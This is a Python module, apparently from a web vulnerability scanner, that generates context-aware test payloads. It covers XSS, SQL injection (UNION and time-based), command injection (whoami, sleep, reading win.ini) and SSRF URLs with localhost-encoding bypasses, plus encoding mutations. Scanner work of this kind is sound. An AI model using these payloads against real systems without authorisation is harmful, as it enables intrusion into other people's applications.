"""Context-aware payload generation for scan plugins."""

from __future__ import annotations

from typing import Any

from dimsum.scanner.payloads import (
    CMDI_PAYLOADS,
    SQLI_ERROR_PAYLOADS,
    SSRF_INTERNAL_URLS,
    XSS_BASIC_PAYLOADS,
)


class PayloadGenerator:
    """Generates context-aware payloads based on parameter metadata and source analysis."""

    def __init__(
        self,
        extracted_parameters: list[dict[str, Any]] | None = None,
        risk_indicators: list[dict[str, Any]] | None = None,
    ):
        self.extracted_parameters = extracted_parameters or []
        self.risk_indicators = risk_indicators or []
        self._param_info = {
            p["name"]: p for p in self.extracted_parameters if "name" in p
        }

    def get_xss_payloads(self, param_name: str, url: str) -> list[str]:
        """Return XSS payloads, prioritized by context."""
        payloads = list(XSS_BASIC_PAYLOADS)

        info = self._param_info.get(param_name, {})

        # Attribute context payloads
        if info.get("context") == "attribute":
            payloads.insert(0, '" onmouseover="alert(1)')
            payloads.insert(0, "' onmouseover='alert(1)'")

        # Script block context
        if info.get("context") == "script":
            payloads.insert(0, "';alert(1)//")
            payloads.insert(0, '";alert(1)//')

        # If innerHTML usage detected, DOM XSS payloads are more relevant
        if self._has_risk_indicator("innerHTML_usage") or self._has_risk_indicator("document_write"):
            payloads.insert(0, '<img src=x onerror=alert(document.domain)>')
            payloads.insert(0, '<svg/onload=alert(1)>')

        # Add encoding mutations for top payloads
        payloads.extend(_generate_encoding_mutations(payloads[:3]))

        return payloads

    def get_sqli_payloads(self, param_name: str, url: str) -> list[str]:
        """Return SQLi payloads, prioritized by context."""
        payloads = list(SQLI_ERROR_PAYLOADS)

        info = self._param_info.get(param_name, {})

        # Source analysis found SQL concatenation — prioritize UNION payloads
        if self._has_risk_indicator("sql_concat"):
            payloads.insert(0, "1 UNION SELECT NULL--")
            payloads.insert(0, "1' UNION SELECT NULL--")
            payloads.insert(0, "1' UNION SELECT NULL,NULL--")

        # Numeric parameter type — use numeric injection payloads
        if info.get("type") in ("int", "integer", "number", "float"):
            numeric_payloads = [
                "1 OR 1=1",
                "1 AND 1=2",
                "1; SELECT SLEEP(5)--",
                "1 UNION SELECT NULL--",
            ]
            payloads = numeric_payloads + payloads

        # Time-based blind SQLi variants
        payloads.extend([
            "1' AND SLEEP(5)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1'; SELECT pg_sleep(5)--",
        ])

        return payloads

    def get_cmdi_payloads(self, param_name: str, url: str) -> list[str]:
        """Return command injection payloads, prioritized by context."""
        payloads = list(CMDI_PAYLOADS)

        # Source code uses shell execution — add timing-based payloads
        if self._has_risk_indicator("shell_exec"):
            payloads.extend([
                "$(sleep 5)",
                "`sleep 5`",
                "| sleep 5",
                "; sleep 5 #",
                "& ping -c 5 127.0.0.1 &",
                "|| sleep 5",
            ])

        # Add OS-specific variants
        payloads.extend([
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "| type C:\\Windows\\win.ini",
        ])

        return payloads

    def get_ssrf_payloads(self, param_name: str, url: str) -> list[str]:
        """Return SSRF payloads, with bypass variants for URL-like parameters."""
        payloads = list(SSRF_INTERNAL_URLS)

        # URL-like parameter names get extra bypass payloads
        url_param_names = {
            "url", "redirect", "target", "uri", "dest", "next",
            "callback", "return", "goto", "link", "href", "src",
        }
        if param_name.lower() in url_param_names:
            payloads.extend([
                "http://127.0.0.1:80",
                "http://127.0.0.1:443",
                "http://127.0.0.1:8080",
                "http://0177.0.0.1",          # Octal
                "http://2130706433",           # Decimal
                "http://127.1",               # Short form
                "http://0x7f000001",          # Hex
                "http://127.0.0.1.nip.io",   # DNS rebinding
            ])

        return payloads

    def get_discovered_params(self) -> list[str]:
        """Return parameter names discovered from source analysis."""
        return list(self._param_info.keys())

    def _has_risk_indicator(self, indicator_type: str) -> bool:
        """Check if a risk indicator of this type exists."""
        return any(ri.get("type") == indicator_type for ri in self.risk_indicators)


def _generate_encoding_mutations(payloads: list[str]) -> list[str]:
    """Generate URL-encoded and case-varied mutations of payloads."""
    mutations = []
    for p in payloads:
        # HTML entity encoding
        mutations.append(p.replace("<", "&lt;").replace(">", "&gt;"))
        # Mixed case
        mutations.append(p.swapcase())
        # Double URL encoding of key chars
        mutations.append(p.replace("<", "%253C").replace(">", "%253E"))
    return mutations
